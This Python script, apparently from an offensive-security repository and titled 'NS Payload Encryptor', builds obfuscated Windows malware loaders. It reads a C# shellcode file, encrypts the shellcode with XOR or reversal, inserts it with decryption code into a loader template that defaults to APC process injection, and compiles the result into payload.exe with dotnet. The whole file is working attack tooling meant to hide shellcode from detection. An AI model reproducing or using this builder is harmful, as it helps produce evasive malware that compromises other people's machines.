#!/bin/env python3


import subprocess
import argparse
import random
import re
import shutil
import string
import sys
import os
import time

# Based on https://github.com/smokeme/payloadGenerator
# and https://github.com/pwndizzle/c-sharp-memory-injection
base_dir = os.getcwd()

def generateEncodedShell(encoder, key, file, sdir):

	# Read payload from file
	if os.path.exists(file):
		shellcode = open(file, "r")
		shelcode_data = shellcode.read()
		# Open the original C# Code for the encoder
		full_template_path = f"{base_dir}{os.sep}{sdir}{os.sep}template"
		original = open(full_template_path, "r")
		data = original.read()

		# Grab the encryption code to place in template
		encryption_template = f"{base_dir}{os.sep}{encoder}{os.sep}encrypt.txt"
		encryptfile = open(encryption_template,"r")
		encryptcode = encryptfile.read()

		# Replace specific bits with newly generated shellcode and key
		data = data.replace("SHELLCODEHERE", shelcode_data)
		data = data.replace("ENCRYPTHERE", encryptcode)

		# if a key is supplied
		if key != "false":
			data = data.replace("KEYHERE", key)

		# Open a new file and write the replaced text here
		temp_tempate_path = f"{base_dir}{os.sep}{sdir}{os.sep}Program.cs"
		template = open(temp_tempate_path, "w+")
		template.write(data)

		# Close files
		original.close()
		template.close()
		shellcode.close()
		encryptfile.close()
	else:
		print("[-] Shellcode path is not exists, please check it!")

def generatePayload(encoder, template_directory, key, sdir, target_framework):
	# Backup the original project file (Payload.csproj.orig) and replace the active Payload.csproj TargetFramework value
	csproj = f"{base_dir}{os.sep}{template_directory}{os.sep}Payload.csproj"
	if not os.path.exists(csproj + ".orig"):
		with open(csproj + ".orig", "w") as orig:
			with open(csproj, "r") as active:
				data = active.read()
				orig.write(data)
	else:
		with open(csproj + ".orig", "r") as orig:
			data = orig.read()
	data = re.sub("<TargetFramework>[^<]+</TargetFramework>", f"<TargetFramework>{target_framework}</TargetFramework>", data)
	with open(csproj, "w") as active:
		active.write(data)
	
	# Build the encrypted version of the shellcode and save it to output.shellcode
	build_command = ["dotnet", "run"]
	os.chdir(f"{base_dir}{os.sep}{sdir}")

	proc = subprocess.run(build_command, capture_output=True)
	with open("output.shellcode", "w") as fp:
		fp.write(proc.stdout.decode())

	# Open the shellcode
	shellcode_path = f"{base_dir}{os.sep}{sdir}{os.sep}output.shellcode"
	shellcode = open(shellcode_path,"r")
	shelcode_data = shellcode.read()

	# Open the original C# code for the payload
	original_code_path = f"{base_dir}{os.sep}{template_directory}{os.sep}template"
	original = open(original_code_path, "r")
	data = original.read()

	# Grab the decryption code to place in template
	decryption_code_path = f"{base_dir}{os.sep}{encoder}{os.sep}decrypt.txt"
	decrypt_file = open(decryption_code_path,"r")
	decrypt_code = decrypt_file.read()

	# Replace specific bits with newly generated shellcode and key
	data = data.replace("SHELLCODEHERE", shelcode_data)
	data = data.replace("DECRYPTHERE", decrypt_code)

	# if a key is supplied
	if key != "false":
		data = data.replace("KEYHERE", key)
	original.close()
	tmp_tempate_path = f"{base_dir}{os.sep}{template_directory}{os.sep}Program.cs"
	template = open(tmp_tempate_path, "w+")
	template.write(data)
	shellcode.close()
	decrypt_file.close()

def cleanUp(encoder,template_directory,outfile,sdir,target_framework):
	#TO DO improve cleaning up of files
	compile_command = ["dotnet", "publish", "-c", "Release", "-r", "win10-x64"]
	os.chdir(f"{base_dir}{os.sep}{template_directory}")
	_ = subprocess.run(compile_command)

	#copy_command
	src = f"{base_dir}{os.sep}{template_directory}{os.sep}bin{os.sep}Release{os.sep}{target_framework}{os.sep}win10-x64{os.sep}payload.exe"
	dst = f"{base_dir}{os.sep}{outfile}"
	if os.path.exists(src):
		shutil.copyfile(src, dst)


	time.sleep(0.5)

	if not args.noclean:
		# delete template
		os.remove(f"{base_dir}{os.sep}{template_directory}{os.sep}Program.cs")
		os.remove(f"{base_dir}{os.sep}{sdir}{os.sep}Program.cs")
		# delete shellcode
		os.remove(f"{base_dir}{os.sep}{sdir}{os.sep}output.shellcode")

		try:
			shutil.rmtree(f"{base_dir}{os.sep}{template_directory}{os.sep}bin")
		except FileNotFoundError:
			pass
		try:
			# delete bin directory
			shutil.rmtree(f"{base_dir}{os.sep}{sdir}{os.sep}bin")
		except FileNotFoundError:
			pass
		try:
			# delete obj directory
			shutil.rmtree(f"{base_dir}{os.sep}{sdir}{os.sep}obj")
		except FileNotFoundError:
			pass
		try:
			# delete template directory
			shutil.rmtree(f"{base_dir}{os.sep}{template_directory}{os.sep}obj")
		except FileNotFoundError:
			pass
	else:
		print("Files not cleaned as -noclean flag present")


parser = argparse.ArgumentParser(description="Generate obfuscated payloads.")

requiredNamed = parser.add_argument_group("required named arguments")

requiredNamed.add_argument(
	"-file",
	dest="file",
	help="C# file with byte[] buf *NOTE* if you see errors, please check the variable is called buf and not my_buf (from Donut) for example.",
	required=True
)


requiredNamed.add_argument(
	"-key",
	 dest="key",
	 help="Key for payload (example: 0xff) *NOTE* no validation is done on key value",
	 required=False,
	  default="false"
  )

requiredNamed.add_argument(
	"-method",
	dest="method",
	help="Payload encryption method (xor,reverse)",
	required=True
)

requiredNamed.add_argument(
	"-template",
	dest="templatedir",
	help="Template Directory for inserting payload and decryption into",
	required=False,
	default="APC_Inj_New"
 )

requiredNamed.add_argument(
	"-shellcode",
	dest="shelldir",
	help="Template Directory for shellcode creation file",
	required=False,
	default="ShellcodeTemplate"
)

requiredNamed.add_argument(
	"-out",
	dest="out",
	help="Output file",
	required=False,
	default="payload.exe"
)

requiredNamed.add_argument(
	"-noclean",
	dest="noclean",
	help="Prevent cleaning up of files for debugging purposes",
	required=False,
)

# https://docs.microsoft.com/en-us/dotnet/standard/frameworks
target_frameworks = ["netcoreapp1.0", "netcoreapp1.1", "netcoreapp2.0", "netcoreapp2.1", 
                     "netcoreapp2.2", "netcoreapp3.0", "netcoreapp3.1", "net5.0", "net6.0", 
                     "netstandard1.0", "netstandard1.1", "netstandard1.2", "netstandard1.3", 
                     "netstandard1.4", "netstandard1.5", "netstandard1.6", "netstandard2.0", 
                     "netstandard2.1", "net11", "net20", "net35", "net40", "net403", "net45", 
                     "net451", "net452", "net46", "net461", "net462", "net47", "net471", 
                     "net472", "net48"]
requiredNamed.add_argument(
	"-targetframework",
	dest="target_framework",
	help="Override the target framework moniker in Payload.csproj project file",
	required=False,
	metavar="TFM",
	choices=target_frameworks,
	default="net45"
)

args = parser.parse_args()

#TO DO - check encrypt/decrypt file in method folder for presence of KEYHERE. If present and args.key = false then break and alert.
if not args.key:
	parser.print_help(sys.stderr)
	exit()

banner = r'''

███╗   ██╗███████╗ ██████╗ ███████╗███╗   ██╗ ██████╗███████╗
████╗  ██║██╔════╝██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔════╝
██╔██╗ ██║███████╗██║  ███╗█████╗  ██╔██╗ ██║██║     ███████╗
██║╚██╗██║╚════██║██║   ██║██╔══╝  ██║╚██╗██║██║     ╚════██║
██║ ╚████║███████║╚██████╔╝███████╗██║ ╚████║╚██████╗███████║
╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝

NS Payload Encryptor by @bb_hacks

'''

print(banner)
print("> Creating encoded shellcode from CS file")
generateEncodedShell(args.method,args.key,args.file, args.shelldir)
print("> Generating payload")
generatePayload(args.method,args.templatedir,args.key, args.shelldir, args.target_framework)
print("> Cleanup")
cleanUp(args.method, args.templatedir, args.out, args.shelldir, args.target_framework)
print("\nIf you didn't see a bunch of red lines before this message, you should see " + args.out + " now :)")
exit()
